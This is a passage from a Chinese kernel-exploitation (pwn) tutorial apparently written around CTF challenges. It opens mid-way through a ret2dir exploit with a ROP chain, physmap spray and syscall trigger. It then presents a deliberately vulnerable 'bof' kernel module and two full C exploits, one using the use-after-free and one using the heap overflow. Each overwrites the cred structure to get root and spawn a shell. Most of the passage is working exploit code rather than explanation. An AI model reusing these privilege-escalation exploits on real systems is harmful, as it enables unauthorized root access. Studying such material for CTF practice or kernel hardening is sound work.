get_shell;</span><br><span class="line">    rop[idx++] = user_cs;</span><br><span class="line">    rop[idx++] = user_rflags;</span><br><span class="line">    rop[idx++] = user_sp;</span><br><span class="line">    rop[idx++] = user_ss;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Spraying physmap...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; <span class="number">15000</span>; i++) &#123;</span><br><span class="line">        <span class="type">sigset_t</span> *page = mmap(<span class="literal">NULL</span>, page_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="built_in">memcpy</span>(page, rop, page_size);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger physmap one_gadget...&quot;</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">    <span class="string">&quot;mov r15,   0xbeefdead;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14,   0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13,   0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r12,   0x33333333;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp,   0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx,   0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11,   0x66666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10,   0x77777777;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,    0xffffffff811483d0;&quot;</span><span class="comment">// pop rsp; ret;</span></span><br><span class="line">    <span class="string">&quot;mov r8,    try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rax,   0x10;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx,   0xaaaaaaaa;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx,   try_hit;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi,   0x1bf52;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi,   dev_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p><strong>流程：</strong></p>
<p>在我们rop处下断点，发现执行到我们喷射的gadget处时，r8(pop rsp)距离rsp有0xa0大小，找到<code>add rsp,0xa0;;;;ret</code>样式的 gadget即可将栈迁移到我们用于提权的 gadget 处。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/image-20240905101112480.png"
                      alt="image-20240905101112480"
                ></p>
<p>（1）利用kgadget_ioctl和pt_regs保留的r8-r9完成栈迁移。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir2.jpg"
                      alt="ret2dir2"
                ></p>
<p>（2）栈不断抬高，执行get_root。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/10/16/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Kernel%E5%8F%8A%E7%9B%B8%E5%85%B3%E4%BE%8B%E9%A2%98/ret2dir.jpg"
                      alt="ret2dir"
                ></p>
<h1 id="内核堆利用"><a href="#内核堆利用" class="headerlink" title="内核堆利用"></a>内核堆利用</h1><h2 id="heap-bof"><a href="#heap-bof" class="headerlink" title="heap_bof"></a>heap_bof</h2><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>题目给了源码，存在<code>UAF</code>和<code>heap overflow</code>两种漏洞。内核版本为<code>4.4.27</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;asm/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> *<span class="title">bof_class</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> bof_major = <span class="number">256</span>;</span><br><span class="line"><span class="type">char</span> *ptr[<span class="number">40</span>];<span class="comment">// 指针数组，用于存放分配的指针</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">long</span> <span class="title function_">bof_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p_arg</span>;</span></span><br><span class="line">    copy_from_user(&amp;p_arg, (<span class="type">void</span> *) arg, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> param));</span><br><span class="line">    <span class="type">long</span> retval = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            copy_to_user(p_arg.buf, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            printk(<span class="string">&quot;copy_to_user: 0x%lx\n&quot;</span>, *(<span class="type">long</span> *) ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            copy_from_user(ptr[p_arg.idx], p_arg.buf, p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            kfree(ptr[p_arg.idx]);</span><br><span class="line">            printk(<span class="string">&quot;free: 0x%p\n&quot;</span>, ptr[p_arg.idx]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            ptr[p_arg.idx] = kmalloc(p_arg.len, GFP_KERNEL);</span><br><span class="line">            printk(<span class="string">&quot;alloc: 0x%p, size: %2lx\n&quot;</span>, ptr[p_arg.idx], p_arg.len);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            retval = <span class="number">-1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">bof_fops</span> =</span> &#123;</span><br><span class="line">        .owner = THIS_MODULE,</span><br><span class="line">        .unlocked_ioctl = bof_ioctl,<span class="comment">//linux 2.6.36内核之后unlocked_ioctl取代ioctl</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">bof_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//设备号</span></span><br><span class="line">    <span class="type">dev_t</span> devno = MKDEV(bof_major, <span class="number">0</span>);</span><br><span class="line">    <span class="type">int</span> result;</span><br><span class="line">    <span class="keyword">if</span> (bof_major)<span class="comment">//静态分配设备号</span></span><br><span class="line">        result = register_chrdev_region(devno, <span class="number">1</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;<span class="comment">//动态分配设备号</span></span><br><span class="line">        result = alloc_chrdev_region(&amp;devno, <span class="number">0</span>, <span class="number">1</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">        bof_major = MAJOR(devno);</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;bof_major /dev/bof: %d\n&quot;</span>, bof_major);</span><br><span class="line">    <span class="keyword">if</span> (result &lt; <span class="number">0</span>) <span class="keyword">return</span> result;</span><br><span class="line">    bof_class = class_create(THIS_MODULE, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    device_create(bof_class, <span class="literal">NULL</span>, devno, <span class="literal">NULL</span>, <span class="string">&quot;bof&quot;</span>);</span><br><span class="line">    cdev_init(&amp;cdev, &amp;bof_fops);</span><br><span class="line">    cdev.owner = THIS_MODULE;</span><br><span class="line">    cdev_add(&amp;cdev, devno, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bof_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    cdev_del(&amp;cdev);</span><br><span class="line">    device_destroy(bof_class, MKDEV(bof_major, <span class="number">0</span>));</span><br><span class="line">    class_destroy(bof_class);</span><br><span class="line">    unregister_chrdev_region(MKDEV(bof_major, <span class="number">0</span>), <span class="number">1</span>);</span><br><span class="line">    printk(<span class="string">&quot;bof exit success\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;exp_ttt&quot;</span>);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">module_init(bof_init);</span><br><span class="line">module_exit(bof_exit);</span><br></pre></td></tr></table></figure></div>

<p><strong>boot.sh</strong></p>
<p>这道题是多核多线程。并且开启了<code>smep</code>和<code>smap</code>。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">  -initrd rootfs.cpio \</span><br><span class="line">  -kernel bzImage \</span><br><span class="line">  -m 512M \</span><br><span class="line">  -nographic \</span><br><span class="line">  -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 quiet kaslr&#x27;</span> \</span><br><span class="line">  -monitor /dev/null \</span><br><span class="line">  -smp cores=2,threads=2 \</span><br><span class="line">  -cpu kvm64,+smep,+smap \</span><br></pre></td></tr></table></figure></div>

<h2 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h2><h3 id="利用思路-8"><a href="#利用思路-8" class="headerlink" title="利用思路"></a>利用思路</h3><p><code>cred</code> 结构体大小为 <code>0xa8</code> ，根据 <code>slub</code> 分配机制，如果申请和释放大小为 <code>0xa8</code>（实际为 <code>0xc0</code> ）的内存块，此时再开一个线程，则该线程的 <code>cred</code> 结构题正是刚才释放掉的内存块。利用 <code>UAF</code> 漏洞修改 <code>cred</code> 就可以实现提权。</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_MALLOC 5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_FREE 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_EDIT 8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BOF_READ 9</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;       <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;        <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> idx;<span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">1</span>&#125;;</span><br><span class="line">    ioctl(fd, BOF_MALLOC, &amp;p);</span><br><span class="line">    ioctl(fd, BOF_FREE, &amp;p);</span><br><span class="line">    <span class="type">int</span> pid = fork(); <span class="comment">// 这个线程申请的cred结构体obj即为刚才释放的obj。</span></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-]fork error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        p.buf = <span class="built_in">malloc</span>(p.len = <span class="number">0x30</span>);</span><br><span class="line">        <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">        ioctl(fd, BOF_EDIT, &amp;p); <span class="comment">// 修改用户ID</span></span><br><span class="line">        <span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+]root success&quot;</span>);</span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-]root failed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是此种方法在较新版本 <code>kernel</code> 中已不可行，我们已无法直接分配到 <code>cred_jar</code> 中的 <code>object</code>，这是因为 <code>cred_jar</code> 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<code>cred_jar</code> 不会再与相同大小的 <code>kmalloc-192</code> 进行合并。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel version == 4.4.72</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred),</span><br><span class="line">				     <span class="number">0</span>, SLAB_HWCACHE_ALIGN|SLAB_PANIC, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// kernel version == 4.5</span></span><br><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">	cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">			SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="Overflow"><a href="#Overflow" class="headerlink" title="Overflow"></a>Overflow</h2><p>溢出修改 <code>cred</code> ，和前面 UAF 修改 <code>cred</code> 一样，在新版本失效。多核堆块难免会乱序，溢出之前记得多申请一些<code>0xc0</code>大小的<code>obj</code>，因为我们 <code>freelist</code> 中存在很多之前使用又被释放的 <code>obj</code> 导致的 <code>obj</code> 乱序。我们需要一个排列整齐的内存块用于修改。</p>
<h3 id="利用思路-9"><a href="#利用思路-9" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
<li>多申请几个<code>0xa8</code>大小的内存块，将原有混乱的<code>freelist</code> 变为地址连续的 <code>freelist</code>。</li>
<li>利用堆溢出，修改被重新申请作为<code>cred</code>的<code>ptr[5]</code>凭证区为<code>0</code>。</li>
</ol>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">param</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> len;    <span class="comment">// 内容长度</span></span><br><span class="line">    <span class="type">char</span> *buf;     <span class="comment">// 用户态缓冲区地址</span></span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> idx; <span class="comment">// 表示 ptr 数组的 索引</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> BOF_NUM = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    <span class="type">int</span> bof_fd = open(<span class="string">&quot;/dev/bof&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (bof_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] Failed to open bof device.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">param</span> <span class="title">p</span> =</span> &#123;<span class="number">0xa8</span>, <span class="built_in">malloc</span>(<span class="number">0xa8</span>), <span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 0x40 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x40</span>; i++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] clear heap done&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 让驱动分配 10 个 0xa8  的内存块</span></span><br><span class="line">    <span class="keyword">for</span> (p.idx = <span class="number">0</span>; p.idx &lt; BOF_NUM; p.idx++) &#123;</span><br><span class="line">        ioctl(bof_fd, <span class="number">5</span>, &amp;p);  <span class="comment">// malloc</span></span><br><span class="line">    &#125;</span><br><span class="line">    p.idx = <span class="number">5</span>;</span><br><span class="line">    ioctl(bof_fd, <span class="number">7</span>, &amp;p); <span class="comment">// free</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用 fork 分配一个 cred结构体</span></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[-] fork error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此时 ptr[4] 和 cred相邻</span></span><br><span class="line">    <span class="comment">// 溢出 修改 cred 实现提权</span></span><br><span class="line">    p.idx = <span class="number">4</span>, p.len = <span class="number">0xc0</span> + <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">memset</span>(p.buf, <span class="number">0</span>, p.len);</span><br><span class="line">    ioctl(bof_fd, <span class="number">8</span>, &amp;p);</span><br><span class="line">    <span class="keyword">if</span> (!pid) &#123;</span><br><span class="line">        <span class="comment">//一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</span></span><br><span class="line">        <span class="type">size_t</span> uid = getuid();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] uid: %zx\n&quot;</span>, uid);</span><br><span class="line">        <span class="keyword">if</span> (!uid) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[+] root success&quot;</span>);</span><br><span class="line">            <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了</span></span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] root fail&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="tty-struct-劫持"><a href="#tty-struct-劫持" class="headerlink" title="tty_struct 劫持"></a>tty_struct 劫持</h2><p><strong>boot.sh</strong></p>
<p>这道题<code>gadget</code>较少，我们就关了<code>smep</code>保护。</p>
